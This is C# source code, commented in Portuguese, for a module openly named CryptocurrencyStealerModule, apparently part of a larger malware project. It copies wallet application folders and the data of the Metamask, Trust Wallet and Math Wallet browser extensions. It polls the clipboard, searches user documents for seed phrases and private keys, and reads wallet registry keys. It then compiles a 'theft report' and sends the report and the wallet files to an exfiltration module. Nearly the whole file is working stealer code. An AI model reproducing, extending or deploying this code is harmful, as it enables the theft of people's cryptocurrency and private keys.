using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace XYZ.modules
{
    /// <summary>
    /// Módulo avançado de captura de criptomoedas
    /// Detecta wallets, extrai chaves privadas, captura seeds e exfiltra automaticamente
    /// Suporta: Bitcoin, Ethereum, Monero, Litecoin, Dogecoin, Binance, Metamask, Trust Wallet, etc.
    /// </summary>
    public class CryptocurrencyStealerModule
    {
        private List<CryptoWallet> discoveredWallets = new List<CryptoWallet>();
        private List<string> stolenData = new List<string>();

        // Padrões Regex para detecção de wallets
        private static readonly Dictionary<string, string> WALLET_PATTERNS = new Dictionary<string, string>
        {
            // Bitcoin
            { "Bitcoin (Legacy)", @"\b(1[a-km-zA-HJ-NP-Z1-9]{25,34})\b" },
            { "Bitcoin (SegWit)", @"\b(bc1[a-z0-9]{39,59})\b" },
            { "Bitcoin (P2SH)", @"\b(3[a-km-zA-HJ-NP-Z1-9]{25,34})\b" },
            
            // Ethereum
            { "Ethereum", @"\b(0x[a-fA-F0-9]{40})\b" },
            
            // Litecoin
            { "Litecoin", @"\b([LM][a-km-zA-HJ-NP-Z1-9]{26,33})\b" },
            
            // Dogecoin
            { "Dogecoin", @"\b(D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32})\b" },
            
            // Monero
            { "Monero", @"\b(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})\b" },
            
            // Ripple (XRP)
            { "Ripple", @"\b(r[0-9a-zA-Z]{24,34})\b" },
            
            // Bitcoin Cash
            { "Bitcoin Cash", @"\b((bitcoincash:)?(q|p)[a-z0-9]{41})\b" },
            
            // Cardano
            { "Cardano", @"\b(addr1[a-z0-9]{58})\b" },
            
            // Solana
            { "Solana", @"\b([1-9A-HJ-NP-Za-km-z]{32,44})\b" },
            
            // BNB (Binance Coin)
            { "Binance", @"\b(bnb1[a-z0-9]{38})\b" },
            
            // Tron
            { "Tron", @"\b(T[A-Za-z1-9]{33})\b" },
            
            // Private Keys (vários formatos)
            { "Private Key (WIF)", @"\b([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b" },
            { "Private Key (Hex)", @"\b([a-fA-F0-9]{64})\b" },
            
            // Mnemonic Seeds (12-24 palavras)
            { "Seed Phrase", @"\b((?:[a-z]+\s){11,23}[a-z]+)\b" }
        };

        // Locais comuns de wallets
        private static readonly string[] WALLET_LOCATIONS = new string[]
        {
            // Caminhos de aplicações de wallet
            @"%APPDATA%\Bitcoin",
            @"%APPDATA%\Ethereum",
            @"%APPDATA%\Electrum",
            @"%APPDATA%\Exodus",
            @"%APPDATA%\atomic",
            @"%APPDATA%\com.liberty.jaxx",
            @"%LOCALAPPDATA%\Coinomi",
            
            // Browser extensions (Metamask, Trust Wallet, etc.)
            @"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn", // Metamask
            @"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph", // Trust Wallet
            @"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\afbcbjpbpfadlkmhmclhkeeodmamcflc", // Math Wallet
        };

        private readonly List<string> _targetWallets = new List<string>
        {
            "Bitcoin", "Ethereum", "Litecoin", "Dash", "Monero", "Exodus", "Atomic", "Metamask"
        };

        public async Task RunStealer()
        {
            SecureLogger.LogInfo("CryptoStealer", "Starting wallet steal operation...");

            // 1. Scan for wallet files
            await ScanWalletFiles();

            // 2. Scan clipboard for crypto addresses
            ScanClipboard();

            // 3. Scan files for recovery keys/seeds
            await ScanFilesForSecrets();
            
            // 4. Scan registry
            ScanRegistry();

            // 5. Exfiltrate
            await ExfiltrateAllData();
        }

        private async Task ScanWalletFiles()
        {
            // Placeholder for scanning wallet files based on locations
            await Task.Run(() =>
            {
               foreach (string location in WALLET_LOCATIONS)
               {
                   try
                   {
                        string expanded = Environment.ExpandEnvironmentVariables(location);
                        if (Directory.Exists(expanded))
                        {
                             // Found a wallet directory
                             string name = Path.GetFileName(location);
                             CopyExtensionData(expanded, name);
                        }
                   }
                   catch {}
               }
            });
        }

        private async Task ScanFilesForSecrets()
        {
            await ScanDocumentsForSeeds();
        }

        private void CopyExtensionData(string path, string extensionName)
        {
            try
            {
                var files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
                
                foreach (string file in files)
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        
                        if (fileInfo.Length > 5 * 1024 * 1024) // Max 5MB
                            continue;

                        byte[] fileData = File.ReadAllBytes(file);
                        string base64 = Convert.ToBase64String(fileData);
                        
                        discoveredWallets.Add(new CryptoWallet
                        {
                            Type = "Browser Extension",
                            ExtensionName = extensionName,
                            FilePath = file,
                            Data = base64,
                            Timestamp = DateTime.UtcNow
                        });
                    }
                    catch { }
                }

                SecureLogger.LogInfo("CryptoStealer", string.Format("Copied extension data: {0}", extensionName));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("CryptoStealer.CopyExtension", ex);
            }
        }

        private void ScanClipboard()
        {
            try
            {
                if (System.Windows.Forms.Clipboard.ContainsText())
                {
                    string clipboardText = System.Windows.Forms.Clipboard.GetText();
                    AnalyzeContent(clipboardText, "Clipboard");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("CryptoStealer.Clipboard", ex);
            }
        }

        private void AnalyzeContent(string content, string source)
        {
            foreach (var pattern in WALLET_PATTERNS)
            {
                try
                {
                    MatchCollection matches = Regex.Matches(content, pattern.Value, RegexOptions.Multiline);
                    
                    foreach (Match match in matches)
                    {
                        string value = match.Groups[1].Value;
                        
                        if (IsValidWalletAddress(pattern.Key, value))
                        {
                            discoveredWallets.Add(new CryptoWallet
                            {
                                Type = pattern.Key,
                                Address = value,
                                Source = source,
                                Timestamp = DateTime.UtcNow
                            });

                            SecureLogger.LogInfo("CryptoStealer", string.Format("Found {0}: {1}...", pattern.Key, value.Substring(0, Math.Min(10, value.Length))));
                        }
                    }
                }
                catch { }
            }
        }

        private void ProcessWalletFile(string file)
        {
           try
           {
               byte[] bytes = File.ReadAllBytes(file);
               string base64 = Convert.ToBase64String(bytes);
               
               discoveredWallets.Add(new CryptoWallet
               {
                   Type = "Wallet File",
                   FilePath = file,
                   Data = base64,
                   Timestamp = DateTime.UtcNow
               });
           }
           catch {}
        }

        private bool IsValidWalletAddress(string type, string address)
        {
            // Validações específicas por tipo
            switch (type)
            {
                case "Bitcoin (Legacy)":
                    return address.Length >= 26 && address.Length <= 35;
                
                case "Ethereum":
                    return address.Length == 42 && address.StartsWith("0x");
                
                case "Seed Phrase":
                    // Valida se são palavras válidas (BIP39)
                    string[] words = address.Split(' ');
                    return words.Length >= 12 && words.Length <= 24;
                
                default:
                    return true;
            }
        }

        private async Task ScanDocumentsForSeeds()
        {
            await Task.Run(() =>
            {
                try
                {
                    string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");

                    string[] searchPaths = { documentsPath, desktopPath, downloadsPath };
                    string[] textExtensions = { "*.txt", "*.doc", "*.docx", "*.pdf" };

                    foreach (string searchPath in searchPaths)
                    {
                        if (!Directory.Exists(searchPath))
                            continue;

                        foreach (string extension in textExtensions)
                        {
                            try
                            {
                                var files = Directory.GetFiles(searchPath, extension, SearchOption.TopDirectoryOnly);
                                
                                foreach (string file in files.Take(50)) // Limita a 50 arquivos
                                {
                                    try
                                    {
                                        // Busca por palavras-chave
                                        string filename = Path.GetFileName(file).ToLower();
                                        if (filename.Contains("seed") || filename.Contains("wallet") || 
                                            filename.Contains("crypto") || filename.Contains("private") ||
                                            filename.Contains("recovery") || filename.Contains("backup"))
                                        {
                                            if (extension == "*.txt")
                                            {
                                                string content = File.ReadAllText(file);
                                                AnalyzeContent(content, file);
                                            }
                                            else
                                            {
                                                ProcessWalletFile(file);
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("CryptoStealer.ScanDocuments", ex);
                }
            });
        }

        private void ScanRegistry()
        {
            try
            {
                // Procura por configurações de wallets no Registry
                string[] registryPaths = new string[]
                {
                    @"Software\Bitcoin",
                    @"Software\Ethereum",
                    @"Software\Electrum",
                    @"Software\Exodus"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath))
                        {
                            if (key != null)
                            {
                                SecureLogger.LogInfo("CryptoStealer", string.Format("Found registry key: {0}", regPath));
                                
                                // Extrai valores
                                foreach (string valueName in key.GetValueNames())
                                {
                                    object value = key.GetValue(valueName);
                                    stolenData.Add(string.Format("Registry: {0}\\{1} = {2}", regPath, valueName, value));
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("CryptoStealer.Registry", ex);
            }
        }

        private async Task ExfiltrateAllData()
        {
            try
            {
                if (discoveredWallets.Count == 0 && stolenData.Count == 0)
                {
                    SecureLogger.LogInfo("CryptoStealer", "No cryptocurrency data found");
                    return;
                }

                // Cria relatório
                StringBuilder report = new StringBuilder();
                report.AppendLine("=== CRYPTOCURRENCY THEFT REPORT ===");
                report.AppendLine(string.Format("Timestamp: {0}", DateTime.UtcNow));
                report.AppendLine(string.Format("Machine: {0}", Environment.MachineName));
                report.AppendLine(string.Format("User: {0}", Environment.UserName));
                report.AppendLine();
                report.AppendLine(string.Format("Total Wallets Found: {0}", discoveredWallets.Count));
                report.AppendLine(string.Format("Additional Data: {0} items", stolenData.Count));
                report.AppendLine();

                // Lista wallets encontrados
                report.AppendLine("=== DISCOVERED WALLETS ===");
                foreach (var wallet in discoveredWallets)
                {
                    report.AppendLine(string.Format("Type: {0}", wallet.Type));
                    if (!string.IsNullOrEmpty(wallet.Address))
                        report.AppendLine(string.Format("  Address: {0}", wallet.Address));
                    if (!string.IsNullOrEmpty(wallet.FilePath))
                        report.AppendLine(string.Format("  File: {0}", wallet.FilePath));
                    if (!string.IsNullOrEmpty(wallet.ExtensionName))
                        report.AppendLine(string.Format("  Extension: {0}", wallet.ExtensionName));
                    if (!string.IsNullOrEmpty(wallet.Source))
                        report.AppendLine(string.Format("  Source: {0}", wallet.Source));
                    report.AppendLine(string.Format("  Timestamp: {0}", wallet.Timestamp));
                    report.AppendLine();
                }

                // Dados adicionais
                if (stolenData.Count > 0)
                {
                    report.AppendLine("=== ADDITIONAL DATA ===");
                    foreach (string data in stolenData)
                    {
                        report.AppendLine(data);
                    }
                }

                // Envia relatório
                byte[] reportBytes = Encoding.UTF8.GetBytes(report.ToString());
                var exfiltrator = new DataExfiltrationModule();
                await exfiltrator.ExfiltrateBytes(reportBytes, 
                    string.Format("crypto_report_{0:yyyyMMdd_HHmmss}.txt", DateTime.UtcNow), 
                    "cryptocurrency");

                // Envia arquivos de wallet individuais
                foreach (var wallet in discoveredWallets.Where(w => !string.IsNullOrEmpty(w.Data)))
                {
                    try
                    {
                        byte[] walletData = Convert.FromBase64String(wallet.Data);
                        string filename = string.Format("crypto_{0}_{1}.dat", wallet.Type, DateTime.UtcNow.Ticks);
                        await exfiltrator.ExfiltrateBytes(walletData, filename, "cryptocurrency_wallet");
                    }
                    catch { }
                }

                SecureLogger.LogInfo("CryptoStealer", "All cryptocurrency data exfiltrated successfully");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("CryptoStealer.Exfiltrate", ex);
            }
        }

        public async Task PerformFullScan()
        {
            await RunStealer();
        }

        private System.Threading.Timer clipboardTimer;

        public void StartClipboardMonitoring()
        {
            clipboardTimer = new System.Threading.Timer((state) =>
            {
                try
                {
                    ScanClipboard();
                }
                catch { }
            }, null, 0, 5000); // Check every 5 seconds
            SecureLogger.LogInfo("CryptoStealer", "Clipboard monitoring started");
        }

        public Dictionary<string, int> GetStatistics()
        {
            var stats = new Dictionary<string, int>();
            foreach (var wallet in discoveredWallets)
            {
                if (stats.ContainsKey(wallet.Type))
                    stats[wallet.Type]++;
                else
                    stats[wallet.Type] = 1;
            }
            return stats;
        }
    }

    public class CryptoWallet
    {
        public string Type { get; set; }
        public string Address { get; set; }
        public string FilePath { get; set; }
        public long FileSize { get; set; }
        public string Data { get; set; } // Base64
        public string ExtensionName { get; set; }
        public string Source { get; set; }
        public DateTime Timestamp { get; set; }
    }
}
